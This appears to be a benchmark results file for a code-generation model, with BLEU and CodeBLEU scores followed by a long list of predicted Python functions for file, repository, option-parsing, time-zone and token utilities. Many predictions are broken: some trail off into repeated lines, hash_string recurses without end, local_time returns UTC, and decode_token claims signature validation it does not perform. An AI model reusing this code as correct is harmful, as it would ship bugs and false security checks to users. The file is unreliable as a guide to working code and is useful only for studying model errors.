{
    "accuracy": 0.0,
    "bleu": {
        "bleu": 0.27117145431548295,
        "precisions": [
            0.730059563954933,
            0.5647525732170322,
            0.5060112693193505,
            0.47475719276425293
        ],
        "brevity_penalty": 0.4833724638469273,
        "length_ratio": 0.5790496001118166,
        "translation_length": 281714,
        "reference_length": 486511
    },
    "codebleu": 0.2928319061631839,
    "preds": [
        "def stop(self):\n        \"\"\"Stops monitoring the predefined directory.\"\"\"\n        if self.is_running:\n            self.is_running = False\n            self.monitor.stop()\n            self.monitor.join()",
        "def _on_moved(self, event):\n        \"\"\"Called when a file in the monitored directory has been moved.\n\n        Breaks move down into a delete and a create (which it is sometimes detected as!).\n        :param event: the file system event\n        \"\"\"\n        if event.is_directory:\n            self._on_moved_on_directory(event)\n        else:\n            self._on_moved_on_file(event)",
        "def teardown(self):\n        \"\"\"Tears down all temp files and directories.\"\"\"\n        for f in self.temp_files:\n            f.close()\n        for d in self.temp_dirs:\n            d.close()",
        "def _check_overwrite(self, target, overwrite):\n        \"\"\"Test whether a file target is not exists or it exists but allow\n        overwrite.\n        \"\"\"\n        if not os.path.exists(target):\n            if not overwrite:\n                return False\n            else:\n                raise IOError(\"File %s does not exist\" % target)\n        return True",
        "def copy(self, other):\n        \"\"\"Copy this file to other place.\"\"\"\n        if self.is_file() and other.is_file():\n            shutil.copy(self.path, other.path)",
        "def docker_client():\n    \"\"\"\n    Clients a Docker client.\n\n    Will raise a `ConnectionError` if the Docker daemon is not accessible.\n    :return: the Docker client\n    \"\"\"\n    if not docker_client_path:\n        raise ConnectionError('Docker daemon not available')\n\n    try:\n        return docker.from_env()\n    except docker.errors.APIError as e:\n        raise ConnectionError(e)",
        "def require_repo_path(func):\n    \"\"\"Decorate methods when repository path is required.\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        if not args[0].startswith(REPO_PATH):\n            raise ValueError('Repository path must start with %s' % REPO_PATH)\n        return func(*args, **kwargs)\n    return wrapper",
        "def clean_repo(before, after):\n    \"\"\" clean repository given before and after states \"\"\"\n    before_repo = before.get('repo')\n    after_repo = after.get('repo')\n    if before_repo and after_repo:\n        shutil.rmtree(before_repo)\n        shutil.rmtree(after_repo)",
        "def get_repository_stats(self):\n        \"\"\"Get repository descriptive stats\n\n        :Returns:\n            #. numberOfDirectories (integer): Number of diretories in repository\n            #. numberOfFiles (integer): Number of files in repository\n        \"\"\"\n        try:\n            stats = self.api.get_repository_stats()\n        except Exception as e:\n            self.log.exception(e)\n            return None, None\n        return stats.get('numberOfDirectories', 0), stats.get('numberOfFiles', 0)",
        "def reset(self):\n        \"\"\"Reset repository instance.\"\"\"\n        self.repo = None\n        self.repo_path = None\n        self.repo_url = None\n        self.repo_name = None\n        self.repo_version = None\n        self.repo_description = None\n        self.repo_author = None\n        self.repo_author_email = None\n        self.repo_author_url = None\n        self.repo_author_name = None\n        self.repo_author_url = None\n        self.repo_author_name = None\n        self.repo_author_email = None\n        self.repo_author_name = None\n        self.repo_author_url = None\n        self.repo_author_name = None\n        self.repo_author_url = None\n        self.repo_author_name = None\n        self.",
        "def load_from_path(self, path, verbose=False, ntrials=None):\n        \"\"\"\n        Load repository from a directory path and update the current instance.\n        First, new repository still will be loaded. If failed, then old\n        style repository load will be tried.\n\n        :Parameters:\n            #. path (string): The path of the directory from where to load\n               the repository from. If '.' or an empty string is passed,\n               the current working directory will be used.\n            #. verbose (boolean): Whether to be verbose about abnormalities\n            #. ntrials (int): After aquiring all locks, ntrials is the maximum\n               number of trials allowed before failing.\n               In rare cases, when multiple processes\n               are accessing the same repository components, different processes\n               can alter repository components between successive lock releases\n               of some other process.",
        "def remove_all(self, path=None, removeEmptyDirs=True):\n        \"\"\"\n        Remove all repository from path along with all repository tracked files.\n\n        :Parameters:\n            #. path (None, string): The path the repository to remove.\n            #. removeEmptyDirs (boolean): Whether to remove remaining empty\n               directories.\n        \"\"\"\n        if path is None:\n            path = self.path\n        if removeEmptyDirs:\n            for root, dirs, files in os.walk(path):\n                for f in files:\n                    os.remove(os.path.join(root, f))\n        else:\n            for root, dirs, files in os.walk(path):\n                for f in files:\n                    os.remove(os.path.join(root, f))",
        "def _is_allowed_path(self, path):\n        \"\"\"\n        Get whether creating a file or a directory from the basenane of the given\n        path is allowed\n\n        :Parameters:\n            #. path (str): The absolute or relative path or simply the file\n               or directory name.\n\n        :Returns:\n            #. allowed (bool): Whether name is allowed.\n            #. message (None, str): Reason for the name to be forbidden.\n        \"\"\"\n        allowed = False\n        message = None\n\n        if path.startswith(self.base_path):\n            allowed = True\n            message = \"Path is allowed\"\n\n        return allowed, message",
        "def _getRelativePath(self, path, split=False):\n        \"\"\"Given a path, return relative path to diretory\n\n        :Parameters:\n            #. path (str): Path as a string\n            #. split (boolean): Whether to split path to its components\n\n        :Returns:\n            #. relativePath (str, list): Relative path as a string or as a list\n               of components if split is True\n        \"\"\"\n        if split:\n            path = path.split(os.sep)\n        return os.sep.join(path)",
        "def getState(self, relaPath=None):\n        \"\"\"\n        Get a list representation of repository state along with useful\n        information. List state is ordered relativeley to directories level\n\n        :Parameters:\n            #. relaPath (None, str): relative directory path from where to\n               start. If None all repository representation is returned.\n\n        :Returns:\n            #. state (list): List representation of the repository.\n               List items are all dictionaries. Every dictionary has a single\n               key which is the file or the directory name and the value is a\n               dictionary of information including:\n\n                   * 'type': the type of the tracked whether it's file, dir, or objectdir\n                   * 'exists': whether file or directory actually exists on disk\n                   * 'pyrepfileinfo': In case of a file or an objectdir whether .%s_pyrepfileinfo exists\n",
        "def getFileInfo(self, relativePath):\n        \"\"\"\n        Get file information dict from the repository given its relative path.\n\n        :Parameters:\n            #. relativePath (string): The relative to the repository path of\n               the file.\n\n        :Returns:\n            #. info (None, dictionary): The file information dictionary.\n               If None, it means an error has occurred.\n            #. errorMessage (string): The error message if any error occurred.\n        \"\"\"\n        info = None\n        errorMessage = None\n        try:\n            info = self.getFileInfo(relativePath)\n        except Exception as e:\n            errorMessage = e.message\n        return info, errorMessage",
        "def isRepoFile(self, relativePath):\n        \"\"\"\n        Check whether a given relative path is a repository file path\n\n        :Parameters:\n            #. relativePath (string): File relative path\n\n        :Returns:\n            #. isRepoFile (boolean): Whether file is a repository file.\n            #. isFileOnDisk (boolean): Whether file is found on disk.\n            #. isFileInfoOnDisk (boolean): Whether file info is found on disk.\n            #. isFileClassOnDisk (boolean): Whether file class is found on disk.\n        \"\"\"\n        isRepoFile = False\n        isFileOnDisk = False\n        isFileInfoOnDisk = False\n        isFileClassOnDisk = False\n        try:\n            self.getFileInfo(relativePath)\n            isRepoFile = True\n        except Exception as e:\n            isRepoFile = False\n            isFileOnDisk = False\n            isFileInfoOnDisk = False\n            isFile",
        "def create_package_tarfile(self, path=None, name=None, mode=None):\n        \"\"\"\n        Create a tar file package of all the repository files and directories.\n        Only files and directories that are tracked in the repository\n        are stored in the package tar file.\n\n        **N.B. On some systems packaging requires root permissions.**\n\n        :Parameters:\n            #. path (None, string): The real absolute path where to create the\n               package. If None, it will be created in the same directory as\n               the repository. If '.' or an empty string is passed, the current\n               working directory will be used.\n            #. name (None, string): The name to give to the package file\n               If None, the package directory name will be used with the\n               appropriate extension added.\n            #. mode (None, string): The writing mode of the tarfile",
        "def rename(self, key, new_key):\n        \"\"\"\n        Renames an item in this collection as a transaction.\n\n        Will override if new key name already exists.\n        :param key: the current name of the item\n        :param new_key: the new name that the item should have\n        \"\"\"\n        if key in self:\n            self[key] = new_key\n        else:\n            raise KeyError(key)",
        "def hash_string(string, encoding='utf-8'):\n    \"\"\"Use default hash method to return hash value of a piece of string\n    default setting use 'utf-8' encoding.\n    \"\"\"\n    if isinstance(string, str):\n        return hash_string(string, encoding)\n    return hash_string(string, encoding, default=hash_string)",
        "def hash_file(abspath, nbytes=None):\n    \"\"\"Return md5 hash value of a piece of a file\n\n    Estimate processing time on:\n\n    :param abspath: the absolute path to the file\n    :param nbytes: only has first N bytes of the file. if 0 or None,\n      hash all file\n\n    CPU = i7-4600U 2.10GHz - 2.70GHz, RAM = 8.00 GB\n    1 second can process 0.25GB data\n\n    - 0.59G - 2.43 sec\n    - 1.3G - 5.68 sec\n    - 1.9G - 7.72 sec\n    - 2.5G - 10.32 sec\n    - 3.9G - 16.0 sec\n    \"\"\"\n    if nbytes is None:\n        nbytes = os.path.getsize(abspath)",
        "def file_hash(abspath, nbytes=None):\n    \"\"\"Return sha256 hash value of a piece of a file\n\n    Estimate processing time on:\n\n    :param abspath: the absolute path to the file\n    :param nbytes: only has first N bytes of the file. if 0 or None,\n      hash all file\n    \"\"\"\n    if nbytes is None:\n        nbytes = os.path.getsize(abspath)\n    return hashlib.sha256(open(abspath, 'rb').read(nbytes)).hexdigest()",
        "def file_hash(abspath, nbytes=None):\n    \"\"\"Return sha512 hash value of a piece of a file\n\n    Estimate processing time on:\n\n    :param abspath: the absolute path to the file\n    :param nbytes: only has first N bytes of the file. if 0 or None,\n      hash all file\n    \"\"\"\n    if nbytes is None:\n        nbytes = os.path.getsize(abspath)\n    return hashlib.sha512(open(abspath, 'rb').read(nbytes)).hexdigest()",
        "def auto_complete(self, case_sensitive=False):\n        \"\"\"\n        A command line auto complete similar behavior. Find all item with same\n        prefix of this one.\n\n        :param case_sensitive: toggle if it is case sensitive.\n        :return: list of :class:`pathlib_mate.pathlib2.Path`.\n        \"\"\"\n        if case_sensitive:\n            return [p for p in self.paths if p.startswith(self.prefix)]\n        else:\n            return [p for p in self.paths if p.startswith(self.prefix)]",
        "def print_big_dirs(self, top_n=10):\n        \"\"\"Print ``top_n`` big dir in this dir.\"\"\"\n        for d in self.list_dir():\n            if d.is_dir():\n                print(d.name)\n                for d in d.list_dir():\n                    print(d.name)\n                    print_big_dirs(top_n)",
        "def print_top_n(self, top_n):\n        \"\"\"Print ``top_n`` big file in this dir.\"\"\"\n        for i in range(top_n):\n            print(self.get_file_path(i))",
        "def print_top_n_big_files(top_n):\n    \"\"\"Print ``top_n`` big dir and ``top_n`` big file in each dir.\"\"\"\n    print('\\nTop {} big files in each dir:'.format(top_n))\n    for root, dirs, files in os.walk(os.path.join(os.path.dirname(__file__), 'big')):\n        for f in files:\n            print('  {}'.format(os.path.join(root, f)))",
        "def create_folder(self, dst):\n        \"\"\"\n        Create a new folder having exactly same structure with this directory.\n        However, all files are just empty file with same file name.\n\n        :param dst: destination directory. The directory can't exists before\n        you execute this.\n\n        **\u4e2d\u6587\u6587\u6863**\n\n        \u521b\u5efa\u4e00\u4e2a\u76ee\u5f55\u7684\u955c\u50cf\u62f7\u8d1d, \u4e0e\u62f7\u8d1d\u64cd\u4f5c\u4e0d\u540c\u7684\u662f, \u6587\u4ef6\u7684\u526f\u672c\u53ea\u662f\u5728\u6587\u4ef6\u540d\u4e0a\n        \u4e0e\u539f\u4ef6\ufffd",
        "def run_py_files(self, py_exe):\n        \"\"\"Execute every ``.py`` file as main script.\n\n        :param py_exe: str, python command or python executable path.\n\n        **\u4e2d\u6587\u6587\u6863**\n\n        \u5c06\u76ee\u5f55\u4e0b\u7684\u6240\u6709Python\u6587\u4ef6\u4f5c\u4e3a\u4e3b\u811a\u672c\u7528\u5f53\u524d\u89e3\u91ca\u5668\u8fd0\u884c\u3002\n        \"\"\"\n        for root, dirs, files in os.walk(py_exe):\n            for filename in files:\n                if filename.endswith('.py'):\n                    self.run_py_file(root, filename)",
        "def _trail_whitespace(self):\n        \"\"\"Trail white space at end of each line for every ``.py`` file.\n\n        **\u4e2d\u6587\u6587\u6863**\n\n        \u5c06\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u88ab\u9009\u62e9\u7684\u6587\u4ef6\u4e2d\u884c\u672b\u7684\u7a7a\u683c\u5220\u9664\u3002\n        \"\"\"\n        for filename in self.files:\n            with open(filename, 'r') as f:\n                for line in f:\n                    line = line.strip()\n                    if line:\n                        self.add_line(line)",
        "def auto_code(self, **kwargs):\n        \"\"\"\n        Auto convert your python code in a directory to pep8 styled code.\n\n        :param kwargs: arguments for ``autopep8.fix_code`` method.\n\n        **\u4e2d\u6587\u6587\u6863**\n\n        \u5c06\u76ee\u5f55\u4e0b\u7684\u6240\u6709Python\u6587\u4ef6\u7528pep8\u98ce\u683c\u683c\u5f0f\u5316\u3002\u589e\u52a0\u5176\u53ef\u8bfb\u6027\u548c\u89c4\u8303\u6027\u3002\n        \"\"\"\n        self.fix_code(**kwargs)",
        "def size(self):\n        \"\"\"File size in bytes.\"\"\"\n        if self._size is None:\n            self._size = self._get_size()\n        return self._size",
        "def get_modify_time(self, timestamp):\n        \"\"\"Get most recent modify time in timestamp.\"\"\"\n        return self.get_timestamp(\n            self.get_modify_time_key(timestamp))",
        "def get_access_time(self, timestamp):\n        \"\"\"Get most recent access time in timestamp.\"\"\"\n        return self.get_access_time_by_timestamp(timestamp, self.access_time_cache)",
        "def get_create_time(self):\n        \"\"\"Get most recent create time in timestamp.\"\"\"\n        return datetime.datetime.utcfromtimestamp(\n            self.get_create_time_in_timestamp()).strftime('%Y-%m-%d %H:%M:%S')",
        "def _list_options(self):\n        \"\"\"Lists options that have not been used to format other values in \n        their sections. \n        \n        Good for finding out if the user has misspelled any of the options.\n        \"\"\"\n        options = self.options\n        for option in options:\n            if option.name not in self.options_to_format:\n                print(option.name)",
        "def _get_option_names(self):\n        \"\"\"List names of options and positional arguments.\"\"\"\n        return [\n            name\n            for name, value in self.options.items()\n            if value.is_positional\n        ]",
        "def add_option(self, opt):\n        \"\"\"Add an Option object to the user interface.\"\"\"\n        if opt.name in self.options:\n            raise ValueError(\"Option %s already exists\" % opt.name)\n        self.options[opt.name] = opt",
        "def add_positional_argument(self, name, type_, default=None,\n                                   description=None,\n                                   required=False,\n                                   optional=False,\n                                   repeat=False,\n                                   default_type=None,\n                                   default_value=None,\n                                   default_value_type=None,\n                                   default_value_optional=False):\n        \"\"\"Append a positional argument to the user interface.\n\n        Optional positional arguments must be added after the required ones. \n        The user interface can have at most one recurring positional argument, \n        and if present, that argument must be the last one.\n        \"\"\"\n        if not required:\n            self.add_argument(name, type_, default=default,\n                               description=description,\n                               required=required,\n                               optional=optional,\n                               repeat=repeat,\n                              ",
        "def _read_docs(self, docsfiles):\n        \"\"\"Read program documentation from a DocParser compatible file.\n\n        docsfiles is a list of paths to potential docsfiles: parse if present.\n        A string is taken as a list of one item.\n        \"\"\"\n        if not docsfiles:\n            return\n        for docfile in docsfiles:\n            try:\n                with open(docfile, 'r') as f:\n                    self._parse_doc(f)\n            except IOError:\n                pass",
        "def get_program_options_help(program_options):\n    \"\"\"Return user friendly help on program options.\"\"\"\n    help = []\n    for option in program_options:\n        if isinstance(option, str):\n            help.append(option)\n        elif isinstance(option, Option):\n            help.append(option.get_help())\n    return '\\n'.join(help)",
        "def get_positional_help(self):\n        \"\"\"Return user friendly help on positional arguments in the program.\"\"\"\n        if self.positional_help is None:\n            return ''\n        return '\\n'.join(self.positional_help)",
        "def _get_help(self, indent, width):\n        \"\"\"Return user friendly help on positional arguments.        \n\n        indent is the number of spaces preceeding the text on each line. \n        \n        The indent of the documentation is dependent on the length of the \n        longest label that is shorter than maxindent. A label longer than \n        maxindent will be printed on its own line.\n        \n        width is maximum allowed page width, use self.width if 0.\n        \"\"\"\n        help = []\n        for arg in self.args:\n            if len(arg) > width:\n                help.append(arg[:width-3])\n            else:\n                help.append(arg)\n        return '\\n'.join(help)",
        "def get_program_options(self, width=None):\n        \"\"\"Return a summary of program options, their values and origins.\n        \n        width is maximum allowed page width, use self.width if 0.\n        \"\"\"\n        if width is None:\n            width = self.width\n        return self.program_options.get_options(width)",
        "def _parse_text_blocks(self, file_obj):\n        \"\"\"Parse text blocks from a file.\"\"\"\n        text_blocks = []\n        for line in file_obj:\n            line = line.strip()\n            if line:\n                text_blocks.append(line)\n        return text_blocks",
        "def _pop_args(self, argv):\n        \"\"\"Pop, parse and return the first self.nargs items from args.\n\n        if self.nargs > 1 a list of parsed values will be returned.\n        \n        Raise BadNumberOfArguments or BadArgument on errors.\n         \n        NOTE: argv may be modified in place by this method.\n        \"\"\"\n        if self.nargs > 1:\n            return [self._pop_arg(argv) for _ in range(self.nargs)]\n        else:\n            return self._pop_arg(argv)",
        "def parse_args(self):\n        \"\"\"Parse arguments found in settings files.\n        \n        Use the values in self.true for True in settings files, or those in \n        self.false for False, case insensitive.\n        \"\"\"\n        if self.args is None:\n            self.args = {}\n        for key in self.args:\n            if key.lower() == self.true.lower():\n                self.args[key] = True\n            elif key.lower() == self.false.lower():\n                self.args[key] = False\n            else:\n                raise ValueError(\"Unknown argument: %s\" % key)",
        "def _get_separator(self, i):\n        \"\"\"Return the separator that preceding format i, or '' for i == 0.\"\"\"\n        if i == 0:\n            return ''\n        if i == 1:\n            return self._get_separator(i - 1)\n        return self._get_separator(i - 2)",
        "def get_authorization_redirect_url(self, request):\n        \"\"\"Return a URL to redirect the user to for OAuth authentication.\"\"\"\n        if self.request_token_url:\n            return self.request_token_url\n        if self.request_token_redirect_url:\n            return self.request_token_redirect_url\n        return self.get_login_redirect_url(request)",
        "def exchange_code(self, code, **kwargs):\n        \"\"\"Exchange the authorization code for an access token.\"\"\"\n        return self.exchange_token(code, self.client_id, self.client_secret, **kwargs)",
        "def acquire(self, timeout=None):\n        \"\"\"Wraps Lock.acquire\"\"\"\n        if timeout is None:\n            timeout = self.timeout\n        return self.lock.acquire(timeout)",
        "def release(self):\n        \"\"\"Wraps Lock.release\"\"\"\n        if self._lock is not None:\n            self._lock.release()\n            self._lock = None",
        "def _handle_custom_type_dict(self, custom_type_dict):\n        \"\"\"Handle a dict that might contain a wrapped state for a custom type.\"\"\"\n        if custom_type_dict is None:\n            return\n        for key, value in custom_type_dict.items():\n            if isinstance(value, State):\n                self.custom_type_states[key] = value",
        "def _wrap_state(self, typename, state):\n        \"\"\"Wrap the marshalled state in a dictionary.\n\n        The returned dictionary has two keys, corresponding to the ``type_key`` and ``state_key``\n        options. The former holds the type name and the latter holds the marshalled state.\n\n        :param typename: registered name of the custom type\n        :param state: the marshalled state of the object\n        :return: an object serializable by the serializer\n        \"\"\"\n        if typename not in self._type_map:\n            raise ValueError('Unknown type: %s' % typename)\n        if state is None:\n            return None\n        return {self.type_key: typename, self.state_key: state}",
        "def enable_http_access(dataset_id):\n    \"\"\"Enable HTTP access to a dataset.\n\n    This only works on datasets in some systems. For example, datasets stored\n    in AWS S3 object storage and Microsoft Azure Storage can be published as\n    datasets accessible over HTTP. A published dataset is world readable.\n    \"\"\"\n    if not is_dataset_in_system(dataset_id):\n        raise ValueError('Dataset %s is not in system' % dataset_id)\n\n    if not is_http_access_enabled(dataset_id):\n        raise ValueError('HTTP access is not enabled' % dataset_id)\n\n    with session.begin(subtransactions=True):\n        session.query(Dataset).filter_by(id=dataset_id).update(\n            http_access_enabled=True)",
        "def update_metadata(metadata, values):\n    \"\"\"Update the descriptive metadata interactively.\n\n    Uses values entered by the user. Note that the function keeps recursing\n    whenever a value is another ``CommentedMap`` or a ``list``. The\n    function works as passing dictionaries and lists into a function edits\n    the values in place.\n    \"\"\"\n    if isinstance(values, CommentedMap):\n        for key, value in values.items():\n            if isinstance(value, CommentedMap):\n                update_metadata(metadata, value.values)\n            else:\n                metadata[key] = value\n    else:\n        metadata.update(values)",
        "def _create_proto_dataset(self, dataset_name, dataset_type,\n                            num_shards, num_replicas,\n                            num_shards_per_replica,\n                            num_replicas_per_shard,\n                            num_shards_per_shard_per_replica,\n                            num_replicas_per_shard_per_replica,\n                            num_shards_per_shard_per_replica,\n                            num_replicas_per_shard_per_replica,\n                            num_replicas_per_shard_per_replica,\n                            num_replicas_per_shard_per_replica,\n                            num_replicas_per_shard_per_replica,\n                            num_replicas_per_shard_per_replica,\n                            num_replicas_per_shard_per_replica,\n                            num_replicas_per_shard_per_replica,",
        "def prompt_readme(self):\n        \"\"\"Interactive prompting to populate the readme.\"\"\"\n        self.readme = ''\n        while True:\n            self.readme += '\\n'\n            self.readme += self.prompt_readme_line()\n            if self.readme:\n                break",
        "def update_readme(self):\n        \"\"\"Default editor updating of readme content.\"\"\"\n        if self.readme:\n            self.editor.set_readme(self.readme)",
        "def show_readme(self):\n        \"\"\"Show the descriptive metadata in the readme.\"\"\"\n        if self.readme:\n            print(self.readme)\n        else:\n            print(\"No readme available.\")",
        "def readme(ds_uri):\n    \"\"\"Use YAML from a file or stdin to populate the readme.\n\n    To stream content from stdin use \"-\", e.g.\n\n    echo \"desc: my data\" | dtool readme write <DS_URI> -\n    \"\"\"\n    if ds_uri:\n        with open(ds_uri, 'r') as f:\n            readme = yaml.load(f)\n    else:\n        readme = ''\n    return readme",
        "def AddFile(self, filename):\n    \"\"\"Add a file to the proto dataset.\"\"\"\n    if filename not in self.files:\n      self.files[filename] = rdf_files.File(filename)\n    return self.files[filename]",
        "def _add_metadata(self, file_name, metadata):\n    \"\"\"Add metadata to a file in the proto dataset.\"\"\"\n    if not self._has_metadata(file_name):\n      self._add_file_metadata(file_name, metadata)",
        "def _proto_to_dataset(proto_dataset):\n    \"\"\"Convert a proto dataset into a dataset.\n\n    This step is carried out after all files have been added to the dataset.\n    Freezing a dataset finalizes it with a stamp marking it as frozen.\n    \"\"\"\n    dataset = Dataset()\n    for file_proto in proto_dataset.file:\n        dataset.add_file(file_proto)\n    for stamp_proto in proto_dataset.stamp:\n        dataset.add_stamp(stamp_proto)\n    for stamp in proto_dataset.stamp:\n        dataset.add_stamp(stamp)\n    return dataset",
        "def copy_dataset(self, dataset_id, new_dataset_id, location):\n        \"\"\"Copy a dataset to a different location.\"\"\"\n        return self.put(self.dataset_path % (dataset_id, new_dataset_id),\n                        headers=self.dataset_headers)",
        "def compress(obj, level=0, return_type=bytes):\n    \"\"\"Compress anything to bytes or string.\n\n    :params obj: \n    :params level: \n    :params return_type: if bytes, then return bytes; if str, then return\n      base64.b64encode bytes in utf-8 string.\n    \"\"\"\n    if isinstance(obj, bytes):\n        return obj\n    elif isinstance(obj, str):\n        return base64.b64encode(obj).decode('utf-8')\n    else:\n        raise TypeError(\"Can't compress %s\" % type(obj))",
        "def _check_for_padded_zeros(self, year):\n        \"\"\"attempt to deduce if a pre 100 year was lost\n         due to padded zeros being taken off\"\"\"\n        if self.is_leap_year(year):\n            return False\n        if self.is_leap_year(year + 1):\n            return False\n        if self.is_leap_year(year + 2):\n            return False\n        if self.is_leap_year(year + 3):\n            return False\n        if self.is_leap_year(year + 4):\n            return False\n        if self.is_leap_year(year + 5):\n            return False\n        if self.is_leap_year(year + 6):\n            return False\n        if self.is_leap_year(year + 7):\n            return False\n",
        "def _tzname_to_bytes(tzname):\n    \"\"\"Change unicode output into bytestrings in Python 2\n\n    tzname() API changed in Python 3. It used to return bytes, but was changed\n    to unicode strings\n    \"\"\"\n    if isinstance(tzname, str):\n        tzname = tzname.encode('utf-8')\n    return tzname",
        "def fromutc(dt, tzinfo=None):\n    \"\"\"\n    The CPython version of ``fromutc`` checks that the input is a ``datetime``\n    object and that ``self`` is attached as its ``tzinfo``.\n    \"\"\"\n    if not isinstance(dt, datetime):\n        raise TypeError(\"Input must be a datetime object\")\n    if not isinstance(tzinfo, pytz.tzinfo):\n        raise TypeError(\"Input must be a pytz.tzinfo object\")\n    return dt.replace(tzinfo=tzinfo)",
        "def local_time(dt):\n    \"\"\"Given a datetime in UTC, return local time\"\"\"\n    dt = dt.replace(tzinfo=pytz.utc)\n    return dt.astimezone(pytz.utc).replace(tzinfo=pytz.utc)",
        "def strip_comments(line):\n    \"\"\"Strip comments from line string.\"\"\"\n    line = line.strip()\n    if line.startswith('#'):\n        line = line[1:]\n    return line",
        "def strip_comments(string, comment_symbols=('#', '//')):\n    \"\"\"\n    Strip comments from json string.\n\n    :param string: A string containing json with comments started by comment_symbols.\n    :param comment_symbols: Iterable of symbols that start a line comment (default # or //).\n    :return: The string with the comments removed.\n    \"\"\"\n    if not string:\n        return string\n    lines = string.splitlines()\n    for line in lines:\n        if line.startswith(comment_symbols):\n            line = line[len(comment_symbols):]\n            lines.remove(line)\n    return '\\n'.join(lines)",
        "def get_weekday(self, dayofweek, whichweek):\n        \"\"\"dayofweek == 0 means Sunday, whichweek 5 means last instance\"\"\"\n        if dayofweek == 0:\n            dayofweek = 6\n        if dayofweek < 6:\n            dayofweek = 6\n        if dayofweek > 6:\n            dayofweek = 6\n        if whichweek == 5:\n            whichweek = 0\n        return self.weekdays[dayofweek][whichweek]",
        "def _registry_key_to_dict(key):\n    \"\"\"Convert a registry key's values to a dictionary.\"\"\"\n    if isinstance(key, six.string_types):\n        key = key.encode('utf-8')\n    return {k: v for k, v in six.iteritems(key) if k != 'HKEY_LOCAL_MACHINE'}",
        "def name_from_string(self, tzname_str):\n        \"\"\"\n        Parse strings as returned from the Windows registry into the time zone\n        name as defined in the registry.\n\n        >>> from dateutil.tzwin import tzres\n        >>> tzr = tzres()\n        >>> print(tzr.name_from_string('@tzres.dll,-251'))\n        'Dateline Daylight Time'\n        >>> print(tzr.name_from_string('Eastern Standard Time'))\n        'Eastern Standard Time'\n\n        :param tzname_str:\n            A timezone name string as returned from a Windows registry key.\n\n        :return:\n            Returns the localized timezone string from tzres.dll if the string\n            is of the form `@tzres.dll,-offset`, else returns the input string.\n        \"\"\"\n        if tz",
        "def get_local_zoneinfo_tz(name):\n    \"\"\"\n    This retrieves a time zone from the local zoneinfo tarball that is packaged\n    with dateutil.\n\n    :param name:\n        An IANA-style time zone name, as found in the zoneinfo file.\n\n    :return:\n        Returns a :class:`dateutil.tz.tzfile` time zone object.\n\n    .. warning::\n        It is generally inadvisable to use this function, and it is only\n        provided for API compatibility with earlier versions. This is *not*\n        equivalent to ``dateutil.tz.gettz()``, which selects an appropriate\n        time zone based on the inputs, favoring system zoneinfo. This is ONLY\n        for accessing the dateutil-specific zoneinfo (which may be out of\n        date compared to the system zoneinfo).\n\n    .. deprecated::",
        "def zonefile_metadata(zonefile):\n    \"\"\"Get the zonefile metadata\n\n    See `zonefile_metadata`_\n\n    :returns:\n        A dictionary with the database metadata\n\n    .. deprecated:: 2.6\n        See deprecation warning in :func:`zoneinfo.gettz`. To get metadata,\n        query the attribute ``zoneinfo.ZoneInfoFile.metadata``.\n    \"\"\"\n    warnings.warn(\n        \"getzonefile_metadata is deprecated and will be removed in a future release. \"\n        \"To get metadata, query the attribute ``zoneinfo.ZoneInfoFile.metadata``.\",\n        DeprecationWarning,\n        stacklevel=2\n    )\n    return zonefile_metadata(zonefile)",
        "def get_http_upload_config(jid):\n    \"\"\"\n    Get the configuration for the given JID based on XMPP_HTTP_UPLOAD_ACCESS.\n\n    If the JID does not match any rule, ``False`` is returned.\n    \"\"\"\n    if not XMPP_HTTP_UPLOAD_ACCESS:\n        return False\n\n    if not jid.startswith('xep_0045'):\n        return False\n\n    if jid.endswith('xep_0045'):\n        jid = jid[4:]\n\n    if jid not in XMPP_HTTP_UPLOAD_ACCESS:\n        return False\n\n    return XMPP_HTTP_UPLOAD_ACCESS[jid]",
        "def is_wall_time(dt, tz=None):\n    \"\"\"\n    Given a datetime and a time zone, determine whether or not a given datetime\n    would fall in a gap.\n\n    :param dt:\n        A :class:`datetime.datetime` (whose time zone will be ignored if ``tz``\n        is provided.)\n\n    :param tz:\n        A :class:`datetime.tzinfo` with support for the ``fold`` attribute. If\n        ``None`` or not provided, the datetime's own time zone will be used.\n\n    :return:\n        Returns a boolean value whether or not the \"wall time\" exists in ``tz``.\n    \"\"\"\n    if tz is None:\n        tz = datetime.tzinfo()\n    return tz.gettz(dt) is None",
        "def _set_tzfile(self, tzfile):\n        \"\"\"Set the time zone data of this object from a _tzfile object\"\"\"\n        if tzfile is None:\n            return\n        if tzfile.tzinfo is None:\n            return\n        self.tz = tzfile.tzinfo\n        self.tz_utc = tzfile.tzinfo.utcoffset(self.tz)\n        self.tz_local = tzfile.tzinfo.localoffset(self.tz)\n        self.tz_utc_offset = tzfile.tzinfo.utcoffset(self.tz_utc)\n        self.tz_local_offset = tzfile.tzinfo.localoffset(self.tz_local)\n        self.tz_utc_offset_utc = tzfile.tzinfo.utcoffset(self.tz_utc_offset)\n        self.tz_local_offset_utc",
        "def normalized(self):\n        \"\"\"\n        Return a version of this object represented entirely using integer\n        values for the relative attributes.\n\n        >>> relativedelta(days=1.5, hours=2).normalized()\n        relativedelta(days=1, hours=14)\n\n        :return:\n            Returns a :class:`dateutil.relativedelta.relativedelta` object.\n        \"\"\"\n        return relativedelta(days=self.days, hours=self.hours)",
        "def hmac_new(secret, data, alg):\n    \"\"\"Create a new HMAC hash.\n\n    :param secret: The secret used when hashing data.\n    :type secret: bytes\n    :param data: The data to hash.\n    :type data: bytes\n    :param alg: The algorithm to use when hashing `data`.\n    :type alg: str\n    :return: New HMAC hash.\n    :rtype: bytes\n    \"\"\"\n    h = hmac.new(secret, data, alg)\n    h.update(secret)\n    return h.digest()",
        "def decode_token(secret, token, alg):\n    \"\"\"\n    Decodes the given token's header and payload and validates the signature.\n\n    :param secret: The secret used to decode the token. Must match the\n        secret used when creating the token.\n    :type secret: Union[str, bytes]\n    :param token: The token to decode.\n    :type token: Union[str, bytes]\n    :param alg: The algorithm used to decode the token. Must match the\n        algorithm used when creating the token.\n    :type alg: str\n    :return: The decoded header and payload.\n    :rtype: Tuple[dict, dict]\n    \"\"\"\n    header, payload = decode_header_payload(secret, token, alg)\n    return header, payload",
